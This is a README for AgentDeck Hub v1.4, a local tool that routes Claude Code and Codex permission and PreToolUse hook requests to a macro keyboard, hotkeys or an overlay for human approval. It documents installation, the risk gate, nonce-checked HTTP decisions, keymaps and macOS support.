# AgentDeck Hub v1.4

## 用 exe

1. 打开 `dist/AgentDeck/`，双击 `AgentDeck.exe`。Hub、USB 键盘后端、热键和浮窗在同一个进程中启动，托盘图标显示总状态；无需安装 Python 或打开终端。保留整个文件夹，包括 `AgentDeck-relay.exe` 和 `_internal/`，不要只复制主程序。
2. 在托盘菜单点“安装到项目…”，选择工作项目的根目录。安装后，在该项目的 Codex 会话里输入 `/hooks` 并信任 AgentDeck 钩子，再开始任务。Claude Code 也使用同一项目安装；程序不会自动改全局 hooks。
3. 每次手动打开（含再次双击）都会弹出“AgentDeck 状态”窗口：钩子、开机自启、宏键盘（USB 直读 / Raw Input / 未连接）、托盘位置，缺什么点对应按钮；第一次点“开始使用”。窗口开着时每秒刷新（会话数、宏键盘状态在启动后才知道）。托盘图标默认在右下角 ^ 里。托盘菜单和浮窗右键菜单（或浮窗上的 ≡）功能相同：状态、会话、下一个待批、键位、诊断、装驱动说明。
4. 需要登录 Windows 后启动时，勾选“开机自启”（登录启动带 `--background`，不弹状态窗口）。自启用当前用户的计划任务 `\AgentDeck`（登录触发，延迟 10 秒）；旧版的 HKCU Run 启动项会在启动时迁移成计划任务，计划任务建不成时保留注册表方式，状态窗口会写明原因。取消勾选会同时移除计划任务和 Run 启动项。退出请使用托盘的“退出”。
5. exe 写入 Claude 全局钩子时用 exec 形式（`command` + `args`，不经过 shell），Git Bash 不会再吃掉路径里的反斜杠；Codex 钩子命令保持原样，不需要重新信任。旧版写入的 Claude 钩子会在启动时自动改写（先备份）。

首次运行会把默认 `hub_keys.json` 和 `hub_prompts.json` 复制到 `~/.agentdeck/`（Windows 通常是 `%USERPROFILE%\.agentdeck\`）。以后编辑这里的文件，重启程序后生效，升级不会覆盖你的修改。默认使用 `default` 键位；可在同目录 `app.json` 中设置 `"profile": "v2_emulation"` 后重启，键位窗口按当前 profile 显示。日志保存在 `~/.agentdeck/logs/app.log`，可从“打开日志文件夹”进入。键盘先尝试 USB 直读，失败后自动使用 Windows Raw Input，无需更换系统 HID 驱动；程序不会修改驱动。诊断显示当前可用的读键方式。1602 串口被占用时只记日志，Hub 继续工作。

“诊断”会检查项目钩子、旧版全局 `agent_lcd.py` 钩子和 relay 路径。只有主动点击“移除旧版钩子”并确认后，程序才会先生成 `*.bak-agentdeck-<时间>` 备份，再移除对应旧钩子。若移动了 `AgentDeck` 文件夹，请在诊断里检查路径，并对使用过的项目重新执行“安装到项目…”，使钩子指向新的 `AgentDeck-relay.exe`；开机自启也需重新勾选。

在开发机重新打包：运行项目根目录的 `build_exe.bat`，使用 `D:/conda/miniconda3` 中的 PyInstaller 6.11.1 和现有依赖，输出仍是 `dist/AgentDeck/`。

Hub answers Claude Code and Codex `PermissionRequest` hooks directly. Approval
does not send Enter or Esc to a terminal. Hub reuses the existing deck window
focus logic and LCD protocol; firmware changes are unnecessary.
No additional dependencies are required beyond the project's installed packages.

## Start and configure

From the project root, using `D:/conda/miniconda3/python.exe` as `python`:

```text
python pc/hub.py --backend none
python pc/hub.py --backend usb -v
python pc/hub.py doctor
python pc/hub_install.py install --dry-run
python pc/hub_install.py install
python pc/hub_install.py uninstall --dry-run
python pc/hub_install.py uninstall
```

The install/uninstall commands above are for the user to execute. Development
tests use temporary homes and never install into the real Claude/Codex settings.
Use `install cc` or `install cx` to select one agent. Existing hooks, including
`agent_lcd.py`, are retained. Existing configuration is backed up as
`*.bak-agentdeck-<timestamp>` before replacement. Repeating an unchanged install
creates neither duplicate entries nor extra backups.

## macOS（未实测）

本节是第一版适配，已通过 Windows 上的离线替身测试，尚未在真 Mac 上运行。
桌面操作只使用系统自带的 `osascript`、`pbcopy`、`screencapture`，不新增依赖。
macOS 自动选择 `hub_desktop_mac.py`；Windows 继续使用原来的桌面和热键实现。
以下命令供用户在 Mac 的项目根目录执行，`python3` 为该机安装的 Python：

```sh
python3 pc/hub.py --backend none --no-lcd
python3 pc/hub.py --backend hotkey --overlay --no-lcd
python3 pc/hub.py doctor
python3 pc/hub_install.py install --dry-run
python3 pc/hub_install.py install --python '/absolute/path/to/python3' --dry-run
```

安装器默认把当前 `sys.executable` 写入 hooks；`--python PATH` 可指定另一个解释器。
Mac 上按 POSIX 规则引用路径，支持空格和单引号。先检查 dry-run 输出，正式安装由用户
执行去掉 `--dry-run` 的命令；开发测试只使用临时 home，不修改真实 Claude/Codex 配置。

权限设置：

1. 打开“系统设置 → 隐私与安全性 → 辅助功能”，允许启动 Hub 的终端、编辑器或 Python。
2. 第一次操作窗口时，允许控制 System Events 和目标应用；可在“自动化”中复查这些授权。
   首次系统命令失败会在日志提示此路径，每次 `osascript` 最多等待 3 秒。
3. 使用截图时，在“屏幕录制”（部分系统叫“屏幕与系统音频录制”）允许对应启动应用。
4. 使用热键时，若当前 Python 已安装可选的 `pynput`，允许“辅助功能”和“输入监控”，
   再由用户重新打开 Hub。缺少 `pynput` 或权限不足会记录提示并禁用热键，HTTP 继续工作。
5. 在“系统设置 → 键盘 → 听写”开启听写，并确认系统听写快捷键与 Hub 配置一致。

窗口支持 Terminal、iTerm2、Visual Studio Code、Cursor、Warp、Ghostty。
标题匹配复用 Windows 的项目名边界、最长项目名、工具名及歧义拒绝规则；例如
`app - Claude` 可匹配项目 `app` 的 Claude 会话，同名多窗口或多会话时拒绝猜测。
匹配后使用 System Events `AXRaise` 并激活应用；粘贴和按键前再次核对目标窗口。
Esc 使用 `key code 53`，模板先经 `pbcopy` 写入 Unicode 文本，再发送 Command+V 和
Return（`key code 36`）。截图用 `screencapture -x <path>` 保存到
`~/.agentdeck/shots/`，只粘贴路径，不回车。剪贴板会被这些操作覆盖。
系统命令失败仅记日志，动作返回 `unavailable`，Hub 保持运行。

语音沿用 v1.2 的轮询、固定目标、60 秒超时和松开停止机制。必须在
`~/.agentdeck/config.json`（或 `--config FILE`）显式配置 `dictation_shortcut`，
没有配置时语音返回 `unavailable`，日志和 doctor 会提示设置方法。
例如合并以下配置，并把系统听写快捷键设为相同的 Control+Option+Space：

```json
{
  "dictation_shortcut": {
    "key_codes": [49],
    "modifiers": ["control", "option"]
  }
}
```

`key_codes` 接受 1–4 个 0–127 的整数，`modifiers` 接受 `command`、`control`、
`option`、`shift`。同一组合用于开始和停止；停止失败时保留语音占用，阻止继续输入，
可在权限恢复后再次发送 `voice_up`。停止时仅向原窗口发送快捷键；焦点已离开且无法恢复、
或原窗口已关闭时，直接结束语音占用，不向新窗口补发快捷键。
轮询间隔为 100 ms 加上系统命令执行时间，无法保证
外部焦点切换与恢复之间绝无语音泄漏。优先用 `AXWindowNumber` 固定窗口；应用不暴露
此属性时按进程 ID 和完整标题固定，改标题会停止守护，重复标题会拒绝激活及输入。
无稳定窗口 ID 时无法区分原窗口与关闭后新建的同进程同标题窗口，需要真机确认各应用能力。

macOS 版 `pynput` 当前只提供 F1–F20，默认 F13–F20 的槽位、批准、拒绝映射可用，
F21–F24 会逐键警告并跳过。可复制 `hub_keys.json` 后用 `--keys FILE` 加载，在其顶层
`hotkey` 对象中保留原映射，并改用这些组合访问其余动作：

```json
{
  "Shift+F13": "voice_toggle",
  "Shift+F14": "screenshot",
  "Shift+F15": "cycle +1",
  "Shift+F16": "cycle -1"
}
```

Ctrl 保持 Control 含义，不自动替换成 Command。pynput 监听不独占系统快捷键，系统或
其他应用仍可能响应；安全键盘输入模式也可能阻止监听。
[pynput 键盘文档](https://pynput.readthedocs.io/en/latest/keyboard.html) 和
[macOS 后端](https://github.com/moses-palmer/pynput/blob/master/lib/pynput/keyboard/_darwin.py)
描述了该平台能力。辅助功能与 System Events 的关系见
[Apple UI scripting 文档](https://developer.apple.com/library/archive/documentation/LanguagesUtilities/Conceptual/MacAutomationScriptingGuide/AutomatetheUserInterface.html)。

Doctor 在 Mac 上增加 `osascript` 可用性和无害的 System Events 辅助功能探测，共九项；
Windows 仍为七项。探测不会移动窗口或发送按键，失败返回非零并给出修复建议。
浮窗仍需 Python 自带的 tkinter；macOS 没有 Windows 的“不抢焦点”窗口样式，点击浮窗
可能取得焦点。USB 驱动、LCD 串口和多显示器截图范围尚未做 Mac 实测，首轮建议
`--backend none --no-lcd` 或热键模式。

真 Mac 验证清单：六种应用的聚焦与歧义拒绝、首次授权/拒绝/恢复、中文模板粘贴和
Esc、截图权限及路径、自定义听写的开始与停止、切窗恢复/改标题/窗口关闭/60 秒超时、
F13–F20 和修饰键组合及缺包降级、doctor 九项结果、含空格路径的 hooks 实际执行、
浮窗与 tkinter。以上均需用户在 Mac 上确认，离线测试不能验证系统授权或原生交互。

## PreToolUse gate (v1.4)

The optional gate also runs before tools when auto mode skips
`PermissionRequest`. Preview and install it explicitly with:

```text
python pc/hub_install.py install --gate --dry-run
python pc/hub_install.py install --gate
python pc/hub.py --overlay --no-lcd
```

These installation commands are for the user; tests use temporary homes. The
gate is a separate `PreToolUse` relay (`--agent cc|cx --gate`) alongside ordinary
status telemetry. Claude uses matcher `Bash|Edit|Write|mcp__.*`; both agents use
a 120-second hook timeout. Reinstall is idempotent and retains an already
installed gate even without `--gate`; `uninstall` removes both relay kinds.

Gate events POST to `/event?agent=cc&gate=1` (or `cx`). Default mode intercepts
high and critical risk; low returns `{}` immediately without waiting or LCD
access. Intercepted requests show `GATE` on the LCD and overlay. High and
critical require two distinct approve presses within 1.5 seconds against the
same displayed request. Passing the gate returns **only `{}`**, never `allow`;
the agent still applies its own permission rules. Critical gates are actionable,
while critical `PermissionRequest` records still require native terminal approval.

**Hub unavailable (fail-closed only for risky operations).** If the relay cannot
get a valid gate answer (hub stopped, missing token, connection error, bad
response), it does not block everything. It classifies the tool call locally with
the same rules as the hub (`pc/hub_risk.py`, shared by `hub.py` and
`hub_relay.py`; `hub.classify` still works), reading `production_hosts`,
`protected_branches` and `mcp_write_tools` from `~/.agentdeck/config.json` when
readable and using the defaults otherwise (`main`, `master`, `release/*`, no
production hosts):

- low risk: prints nothing, exit 0, the agent continues normally;
- high or critical: prints the gate deny JSON below, with a reason saying the hub
  is unavailable;
- unclassifiable input (malformed JSON, non-`PreToolUse` event, missing
  `tool_name`): prints nothing, does not block, and appends a line to
  `~/.agentdeck/relay.log`.

The failure path imports only the standard library (no serial, tkinter or usb);
it takes about 150 ms per call on the development machine, of which about 80 ms
is Python startup.

Deny, approval timeout (110 seconds by default), Stop/Interrupt/SessionEnd, or
Hub shutdown returns:

```json
{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":"Blocked by AgentDeck gate: <reason>"}}
```

Gate relay errors, missing Hub/token, and unexpected responses also deny.
Ordinary relay errors retain the silent native fallback. Gate read timeout is
`approve-timeout + 5` seconds. A successful gate records the canonical SHA-256
of the complete tool input, keyed by full agent/session identity, for 30 seconds.
A later matching permission request shows `已在闸门确认` in the overlay and
`Gate confirmed` on the character LCD, with `gate_confirmed: true` in `/state`.
It still waits for an explicit approve press; high risk needs one additional
press in this case. Critical permission requests retain native confirmation.
Repeated gate events always require a new gate decision. Every intercepted
gate decision is audited with `source: "gate"`.

Hub reads `%USERPROFILE%/.agentdeck/config.json` if present; `--home` relocates
it with the token/audit, and `--config FILE` chooses an explicit file. Example:

```json
{
  "gate_mode": "high",
  "require_nonce": false,
  "production_hosts": ["prod", "*.production.example.com"],
  "protected_branches": ["main", "master", "release/*"],
  "mcp_write_tools": ["mcp__database__write", "mcp__deploy__*"]
}
```

`gate_mode` is `high` (default), `low` (also intercept low-classified requests),
or `off`; `--gate-mode` overrides the file. Host, protected-branch, and MCP tool
lists accept shell-style patterns. Configure production SSH names/aliases
explicitly; SSH config files and runtime Git upstreams are not resolved.
No MCP tools are listed by default. The current three-level classifier groups
L0/L1 together as `low`, so low mode gates both. Defaults include protected or
forced Git pushes (including forced/wildcard refspecs and all/mirror pushes),
reset/clean/deletion rules, PR merges, kubectl apply/delete/exec, terraform
apply/destroy, helm upgrade, SQL writes and common migration commands, and
writes to `.env`, `.ssh`, private key/certificate files or credential JSON.
Deployment commands are intercepted regardless of context; classification uses
the existing conservative regex rules rather than resolving cluster state.

Hub defaults to HTTP input only. `--backend usb` first tries direct reads through
`deck_usb.USBInput`, then falls back to Windows Raw Input for VID 4132 / PID 2107
when USB cannot open or disconnects. Both paths feed the same HID bindings and
preserve device-local modifiers and key releases. The reader retries USB every
two seconds while using Raw Input, so unplugging or changing drivers does not
require a restart. Logs identify the active reader. Raw Input observes keyboard
events without suppressing them; keys can also reach the foreground window.
It does not change drivers or keymaps.
Run one AgentDeck keyboard reader at a time: use Hub's USB mode in place of
`deck.py run` / `daemon.py --deck` when testing Hub controls.

### 实测 4 列 × 5 排 宏键盘出厂键位表（USB 模式）

2026-11-20 用只读 Raw Input 探针逐颗实测（按位置从上到下、从左到右，再逐个旋钮），对应 `pc/hub_keys.json` 默认 profile（v6）。
键帽上印的字不可靠，按位置找键。历史 `v2_emulation` 的 Space/Q/V 分别选择槽位 4/5/6，Ctrl+0 为 interrupt；Ctrl+C/V 在两种 profile 中均留空：

| 排 \ 列 | 第 1 列 | 第 2 列 | 第 3 列 | 第 4 列 |
| --- | --- | --- | --- | --- |
| **第 1 排** | E (`hid:0x08`)<br>`slot 1`（会话 1） | B (`hid:0x05`)<br>`slot 2`（会话 2） | Ctrl+Z (`ctrl+hid:0x1D`)<br>`slot 3`（会话 3） | Space (`hid:0x2C`)<br>`interrupt`（打断） |
| **第 2 排** | G (`hid:0x0A`)<br>`approve`（✓ 批准） | Ctrl+F (`ctrl+hid:0x09`)<br>`deny`（✗ 拒绝） | H (`hid:0x0B`)<br>`voice_down`/`up`（按住说话） | Alt（只发修饰键，没有字母）<br>未绑定 |
| **第 3 排** | L (`hid:0x0F`)<br>`screenshot`（截图） | M (`hid:0x10`)<br>`prompt continue`（继续） | Ctrl+T (`ctrl+hid:0x17`)<br>`prompt tests`（跑测试） | Ctrl+D (`ctrl+hid:0x07`)<br>`prompt summary`（总结进度）<br>⚠ 危险键（Raw Input 下连按两次退出 Claude Code） |
| **第 4 排** | Ctrl（只发修饰键）<br>未绑定 | Shift（只发修饰键）<br>未绑定 | U (`hid:0x18`)<br>`prompt commit`（提交） | X (`hid:0x1B`)<br>`cycle +1`（下个会话） |
| **第 5 排** | Tab (`hid:0x2B`)<br>`next_wait`（跳到等我的会话） | Ctrl+C (`ctrl+hid:0x06`)<br>（留空）⚠ 危险键 | Ctrl+V (`ctrl+hid:0x19`)<br>（留空）⚠ 危险键 | P (`hid:0x13`)<br>`cycle -1`（上个会话） |

旋钮 1：顺时针 F (`hid:0x09`) `cycle +1`、逆时针 S (`hid:0x16`) `cycle -1`，按下 L 截图。
旋钮 2：顺时针 R (`hid:0x15`) `cycle +1`、逆时针 P (`hid:0x13`) `cycle -1`，按下 Q 显示浮窗（`show`）。
旋钮 3：- (`hid:0x2D`) `scroll 1`、= (`hid:0x2E`) `scroll -1`（在所选会话窗口上发鼠标滚轮，往下 / 往上；哪个方向发 - 还没测准），按下 V `scroll end`（滚到底）。
旋钮 4：] (`hid:0x30`) `nav down`、[ (`hid:0x2F`) `nav up`（方向键，只在会话等你时；转向还没测准），按下 C (`hid:0x06`) `nav enter`（回车）。
`ctrl+hid:0x27`（Ctrl+0）也保留为 `nav enter`，给别的键盘用；这把键盘的旋钮 4 按下实测是 C，不是 Ctrl+0。
未改动过的 v3、v4 或 v5 键位文件启动时自动升级到 v6（旧文件存为 `hub_keys.json.bak-v3` / `.bak-v4` / `.bak-v5`）。详情见 `pc/hub_keys.md`。

读键方式不是 USB 直读时（Raw Input），每颗键也会打进前台窗口：Hub 拒绝 `prompt`、`nav`、`voice_down`、`voice`、`screenshot`，
提示“按键会漏进窗口：先用 Zadig 把接口 0 换成 WinUSB”；切会话、批准/拒绝、打断、滚动、显示浮窗照常。

## 没有 AgentDeck 硬件怎么用

Windows 用户可以通过全局热键或鼠标使用 Hub，无需安装驱动或更换 WinUSB。
以下命令在项目根目录运行，`python` 指 `D:/conda/miniconda3/python.exe`；
没有 LCD 时加 `--no-lcd`：

```text
python pc/hub.py --backend hotkey --overlay --no-lcd
python pc/hub.py --overlay --no-lcd
python pc/hub.py --backend hotkey --no-lcd
python pc/hub.py --backend usb,hotkey --overlay
```

VIA/QMK 键盘或普通宏键盘：在键盘配置工具中把按键改成 F13–F24，
需要模板时再设置 Ctrl+F13–F16。Stream Deck：添加“系统 → 热键”动作，
发送相同的 F13–F24 或 Ctrl 组合。不需要键盘也可以只开浮窗，用鼠标
选择槽位、点击 ✓ 批准或 ✗ 拒绝。会话仍来自已有的 Claude/Codex Hub hooks；
这些命令只启动 Hub，不会安装 hooks。安装方式见上文，由用户执行。

| 热键 | 默认动作 |
| --- | --- |
| F13–F18 | 选择固定槽位 1–6 |
| F19 / F20 | 批准 / 拒绝当前显示的请求 |
| F21 | 按一下开始语音，再按一下停止（`voice_down` / `voice_up`） |
| F22 | 截图并粘贴路径 |
| F23 / F24 | 下一个 / 上一个会话 |
| Ctrl+F20 | 中断 |
| Ctrl+F13 | `prompt continue`，继续 |
| Ctrl+F14 | `prompt tests`，跑测试 |
| Ctrl+F15 | `prompt summary`，总结进度 |
| Ctrl+F16 | `prompt commit`，提交 |

热键映射位于 `hub_keys.json` 的顶层 `hotkey` 对象，与 USB `bindings` 和
`v2_emulation` 独立；`--keys FILE` 可换文件，`--profile` 只选择 USB 布局。
键名支持 F13–F24 及 Ctrl、Shift、Alt 组合，例如 `Shift+F13`、`Alt+F24`、
`Ctrl+Shift+F14`。F21 的 `voice_toggle` 在发送前检查真实语音状态，
因此 60 秒超时结束后，下次按键会重新开始。热键按下触发，持续按住不重复。
若某个组合已被占用，只记录该键的一条警告，其余组合继续工作。

浮窗宽约 360 px，始终置顶，不占任务栏按钮（工具窗口样式）。始终列出已有会话（最多 6 行），没有会话时显示“还没有会话”提示；
等你的会话名字为琥珀色并带“· 等你”；运行中的会话名字后用灰字显示当前工具（取自 PreToolUse，最多 20 字）；多个会话在同一窗口时标“同窗”。
会话列表下方显示所选会话（未选时为第一个等你的会话）的最新一句话：Stop 的 `last_assistant_message`（回复）、Notification 的 `message`（提醒）、
AskUserQuestion 的问题和选项（提问）、UserPromptSubmit 的 `prompt`（你）；按显示宽度折行，最多 8 行 × 46 列，只在文字变化时刷新控件。
Hub 每个会话只保留最后 4000 字（`/state` 里的 `last_text`、`last_kind`、`last_text_at`），relay 也只转发末尾 4000 字。
有待批请求时在列表下方多出命令详情与审批按钮；显示同一会话的请求时隐藏最新一句话。每次按宏键盘，结果（如“槽位 1 没有会话”）在标题处显示约 2 秒，失败时 LCD 也显示 `KEY: ...`。
用 Raw Input 读键时浮窗顶部常驻红字“按键会漏进窗口：先用 Zadig 把接口 0 换成 WinUSB”，点它看 `agentdeck/装驱动.md` 的步骤；USB 直读时不显示。点标题处的彩色圆点可选会话。
点关闭（×）只隐藏浮窗，Hub 进程继续在后台运行；有新的待批请求或按旋钮 2 时浮窗会重新出现。
Windows 上每 250 ms 唤醒一次界面线程，防止 Tcl 阻塞在 GetMessage 导致浮窗冻结；看门狗发现卡顿时也会发送唤醒。
Hub 真正退出只通过 `stop_agentdeck.bat` 或终端 Ctrl+C。
浮窗可用鼠标左键拖动到屏幕任意位置，坐标自动持久化到 `~/.agentdeck/overlay.json`，下次启动沿用。
标题栏右侧提供“半透明”开关（窗口透明度 0.85，默认开启），点击可在半透明和完全不透明间切换，状态同步保存。
每 300 ms 从 Hub 的线程安全状态接口刷新 6 个槽位：RUN 绿、ASK 琥珀、
DONE 蓝、ERR 红、IDLE 灰。待批请求显示最多 80 字的命令摘要和风险档；
high 用红色提示，首次 ✓ 提示再按一次，仍需在 1.5 秒内确认。
critical 显示 `LOCKED: use terminal`，禁用决定按钮，使用终端原生确认。
鼠标按钮和热键使用与 HTTP `/action` 相同的状态机与风险检查；
按钮绑定按下时画面中的请求 ID 和 nonce，画面过期时拒绝操作，不会改批后来的请求。
浮窗使用 Windows `WS_EX_NOACTIVATE` 并在按钮操作时保护原窗口焦点；
选择槽位会按现有逻辑主动切到对应会话窗口。

热键通过标准库 ctypes 调用
[RegisterHotKey](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-registerhotkey)，
独立消息线程在退出时注销所有成功注册的组合。浮窗使用标准库 tkinter 和
[Windows 扩展窗口样式](https://learn.microsoft.com/en-us/windows/win32/winmsg/extended-window-styles)。
无需新增依赖。离线验证使用替身，不实际注册热键或弹窗；Windows 真机的
按键、前台焦点和显示效果由主会话验证。

The address is always `127.0.0.1`. `--port` changes the default port 47800.
`--approve-timeout` changes the default 110-second permission wait. Use the same
options with `hub_install.py install` (or `hub_relay.py` for manual hook setup).
Installed permission hooks have a 120-second timeout, so keep the hub wait plus
the relay's five-second margin below that limit. Codex receives only supported
events; Claude additionally receives `Notification` and `PostToolUseFailure`.

On first startup Hub creates `%USERPROFILE%/.agentdeck/token`; relay reads this
file without creating it. Requests other than `GET /health` require the exact
`X-AgentDeck-Token` header. A missing hub/token, transport error, or timeout
causes relay to print nothing and exit 0, preserving the native approval flow.
The running Hub writes `~/.agentdeck/hub.json` (pid, port); when that process is
gone the relay returns at once instead of waiting about 2 s for Windows to refuse
the port. Otherwise it connects with a 0.1-second timeout (0.5 s when the Hub is
known to run). The permission read timeout is `approve-timeout + 5` seconds counted
from hook start (ordinary events: five seconds). Permission and gate events are
forwarded byte-for-byte; ordinary events are reduced to the fields the Hub uses.
Lone UTF-16 surrogates are replaced with U+FFFD. Empty stdin is a launch probe and
invalid arguments also exit 0 (never 2, which Claude Code treats as blocking).
A request whose hook client disconnects (killed relay, native answer, Esc) is
dropped and audited as `abandoned`; so is one whose session sends a new prompt or
finishes the identical tool call. `AskUserQuestion` / `ExitPlanMode` permission
requests go straight to the native UI (the session shows “需回答”); approve then
focuses that session's window. Window focus, paste, screenshot and dictation run
outside the Hub lock, so hook events never wait for them.

## HTTP

Every approval request exposes a random 32-bit integer `nonce` beside its `id`
in `/state`. Send both values in decisions, including the second high-risk
confirmation:

```json
{"action": "approve", "request_id": "<displayed id>", "nonce": 305441741}
```

Both `approve` and `deny` reject an invalid, mismatched, already decided, or
expired nonce with HTTP 409 and `{"error":"stale_nonce"}`. Validation refers to
`displayed_request_id`, not another pending request. Rejection is audited and
does not change request state. Nonces expire at the approval deadline (110 s by
default), even if maintenance has not removed the request yet. Approval during
the first 300 ms after a request switch or its first confirmed render returns
409 `switch_guard`; denial remains available immediately. Guard checks retain
the trusted receipt time through queue, modifier-release and lock waits; client
JSON timestamps cannot override it. This guard also applies to legacy decisions
without a nonce. Issued nonce values are reserved for the Hub process lifetime,
including after expiry, so a random collision is resampled rather than reused.

Legacy HTTP clients may omit the nonce by default; `/state` reports
`nonce_required: false`. Set `"require_nonce": true` in the Hub configuration to
reject nonce-free **approve** actions with 409 `nonce_required`. Legacy denial
remains available. A supplied nonce is always validated, regardless of this flag.

The overlay and virtual device send the nonce actually drawn when clicked;
overlay button releases retain the value captured at press. Hotkeys and USB
capture the last acknowledged LCD / rendered overlay snapshot on receipt,
before waiting for the Hub lock or modifier release. Reading `/state` alone
never marks a request as rendered. With neither LCD nor overlay rendered,
hardware decisions fail closed; HTTP and virtual-device decisions still work.
LCD acknowledgments use the existing `set` / `focus` protocol. Empty, failed or
partial acknowledgments retain the previous snapshot. The nonce's four low
hexadecimal digits appear in the overlay / virtual device and, when the existing
name field has sufficient room, on the LCD. Firmware and hooks are unchanged.

Audit records include the request nonce. Rejected decisions additionally record
`reason`, `action`, `supplied_nonce`, and `supplied_request_id`; their `decision`
is `stale_nonce`, `switch_guard`, or `nonce_required`. These records use the same
hash chain as approval decisions.

| Method and route | Behavior |
| --- | --- |
| `GET /health` | Public liveness check, returning `{"ok":true}`. |
| `POST /event?agent=cc` / `?agent=cx` | Accepts a hook JSON object; ordinary events return `{}` immediately, while permission requests wait for a decision or timeout. `&gate=1` enables the PreToolUse gate described above. |
| `GET /state` | Returns sessions, pending requests, selected slot, and `displayed_request_id`. |
| `GET /audit?limit=50` | Returns the most recent audit records, oldest first (limit 1..1000; token required). |
| `POST /action` | Runs the same action path used by the USB keyboard. |

Permission input example:

```json
{
  "session_id": "12345678-abcd-1234-abcd-123456789abc",
  "cwd": "D:/work/my-project",
  "hook_event_name": "PermissionRequest",
  "tool_name": "Bash",
  "tool_input": {"command": "python -m unittest"}
}
```

Action examples:

```json
{"action": "slot 2"}
{"action": "cycle -1"}
{"action": "approve", "request_id": "<id from /state>"}
{"action": "deny"}
{"action": "interrupt"}
{"action": "voice"}
{"action": "voice_down"}
{"action": "voice_up"}
{"action": "screenshot"}
{"action": "prompt tests"}
{"action": "prompt 跑测试"}
{"action": "scroll 3"}
{"action": "scroll end"}
{"action": "nav down"}
{"action": "nav enter"}
```

`scroll N` (nonzero, |N| <= 20; `end` = 100) focuses the selected session's window and
sends one SendInput batch: move the cursor to an unobscured point of that window,
wheel `-120*N`, move back. `nav up|down|enter` focuses it and sends the arrow key
or Enter. `nav` returns HTTP 409 while that session has a pending or locked request,
while its own permission dialog is open (AgentDeck timed out, or a `permission_prompt`
notification), and `nav up/down` only works while the session waits (questions,
elicitation). Voice blocks both, like other window actions.

`slot` also accepts `{"action":"slot","slot":2}`; `cycle` accepts a `delta`
integer; `prompt` accepts a template `name`. Unknown templates or actions are
rejected. `request_id` is optional; supplying it rejects stale decisions with
HTTP 409. Approve/deny responses always include `request_id` (null if no request
is displayed). A first high-risk approve returns `status: "confirm"`; a second
within 1.5 seconds returns `status: "allowed"`. Deny returns `status: "denied"`.
Critical requests immediately return `{}` to the hook, requiring the agent's
native terminal confirmation. Their retained records have `status: "locked"`;
approve, deny, and interrupt return `status: "locked"` without deciding or
injecting keys. Responses retain `action` and `request_id` for stale-id checks.

The permission hook response is:

```json
{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}
```

Deny uses `{"behavior":"deny","message":"Denied from AgentDeck"}`. Timeout,
session end, stop/interrupt events, and hub shutdown release pending hooks with
`{}`, allowing the agent's normal flow. Codex responses never contain
`updatedInput`, `updatedPermissions`, or `interrupt`.

## Selection, display, and actions

Sessions are keyed by the full `(agent, session_id)` pair. The lowest free slot
1..6 is assigned once and released on `SessionEnd`; other slots never move.
第 7 个新会话会淘汰最久没更新、没有 pending/locked 请求、也不是语音目标的
会话；六个槽位全部忙时才返回 HTTP 409，由 agent 原生处理。`/state` includes each session's
cwd, project/name, state, last update, last hook event (`last_event`), LCD key, slot and full pending details.

`/state` 的 `recent_ended` 列出最近 8 个被移除的会话（旧的在前）：`agent`、`session_id`、`slot`、`name`、`cwd`、
移除前的 `state` 和 `last_event`、`last_text`/`last_kind`/`last_text_at`、`label`、`ended_at`，`ended_by` 为
`SessionEnd`、`idle`（6 小时没动静）或 `evicted`（被第 7 个会话挤掉），`reason` 是 SessionEnd 自带的 reason（最多 64 字）。
`codex exec` 在 Stop 之后几毫秒就发 SessionEnd，会话立刻从 `sessions` 消失；它的 done 状态和回复只能在这里看到。只存内存，重启清空。

The first waiting request is displayed automatically. Further arrivals preserve
that request. After a decision or timeout the next request is displayed in
arrival order. Slot/cycle explicitly selects a session and its oldest pending
request, if present. Approval always targets the displayed request, even when
another window is foreground. Interrupt denies a pending request; if none is
displayed but the queue is nonempty, it denies the oldest. With no pending
request it focuses the selected session and sends one Esc.

Locked records are separate from the actionable pending queue: `/state` includes
`locked`, and each session includes `locked_requests`. With no actionable queue,
the oldest locked record is displayed; a new actionable request takes priority.
Slot/cycle can select locked sessions. Notification events and LCD heartbeats
retain the warning; the next progress event (for example PreToolUse, Stop, or
SessionEnd) clears that session's locked records. The audit history remains.

LCD keys exactly match `agent_lcd.hook_line`: `cc-` or `cx-` followed by the first
six session-id characters after removing hyphens. Hub sends existing `set`,
`end`, and `focus` commands. Every focus send holds `focus_lock` and touches
`daemon.DECK_HOLD`; a heartbeat renews the hold every 20 seconds. Missing LCD
hardware logs a warning and does not prevent decisions. The first high-risk
press shows `HOLD! press again` using the existing scrolling name field.
Critical requests show `LOCKED: use terminal` in that same scrolling field,
using the firmware's existing `wait` state. Firmware changes are unnecessary.

Window actions first use the window the relay recorded for the session: on every
ordinary hook the relay takes its console window's root owner (Windows Terminal owns
its hidden ConPTY window), else walks its parent processes (max 12, each parent must
be older than its child; never past explorer.exe) to the first one owning a visible,
unowned, titled top-level window, and sends it as `agentdeck_window`. The Hub stores
`hwnd` and `window_exe`; focus compares window handles only, because Claude Code keeps
rewriting its terminal title. A closed window (or a reused handle of another program)
falls back to the deck's project/title matching, which rejects ambiguous matches;
both failing reports `窗口已关闭或找不到`. Several sessions in one window (terminal
tabs, or every Claude Code session hosted in the Claude desktop app) can only bring the
window forward; the slot result then carries `shared_window: true` and the key feedback reads
“已选槽位 N（同窗：只能调到前台）”. When the recorded window is shared, a different terminal
window uniquely matching the project name and tool word takes priority. Screenshot captures all
screens to `%USERPROFILE%/.agentdeck/shots/<timestamp>.png` and pastes its path
without Enter. Prompt pastes a named template then sends Enter. Clipboard and
key effects verify the selected foreground window handle.

Hold H to speak: `voice_down` snapshots the selected session and window handle,
focuses that window, then sends Win+H. A daemon checks the foreground handle
every 100 ms and restores the original target using the deck's activation logic
(including its AttachThreadInput fallback). Each successful recovery is counted
and logged. Changing titles or incoming permission requests do not retarget the
guard. Release H (`voice_up`) stops and joins the guard, then sends Win+H again
to stop dictation. Repeated down/up actions are idempotent. The legacy `voice`
action performs down immediately followed by up, sending both Win+H combinations.

The guard also stops at 60 seconds, on a lost window, on failed recovery, on the
target's SessionEnd, or on Hub shutdown. After recovery, release briefly displays
`VOICE: kept target` in the LCD's existing scrolling name field. Timeout, target
loss and focus failure display `VOICE: timeout`, `VOICE: target lost` and
`VOICE: focus lost`; a failed shutdown combination displays `VOICE: stop failed`.
